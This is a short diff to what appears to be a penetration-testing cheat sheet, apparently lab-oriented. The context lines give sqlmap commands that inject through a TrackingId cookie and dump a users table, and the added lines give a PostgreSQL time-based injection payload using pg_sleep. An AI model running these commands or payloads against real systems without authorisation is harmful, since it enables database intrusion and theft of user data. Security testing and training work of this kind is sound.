@@ -303,6 +303,11 @@ docker run -it --rm secsi/sqlmap -u "<target_url>" --cookie="TrackingId=1" -p "T
 docker run -it --rm secsi/sqlmap -u "<target_url>" --cookie="TrackingId=1" -p "TrackingId" --level 3 -T users --dump
 ```
 
+CHECK WITH THIS:
+```
+TrackingId=x'||pg_sleep(5)--
+```
+
 if
 ```css
 [WARNING] false positive or unexploitable injection point detected
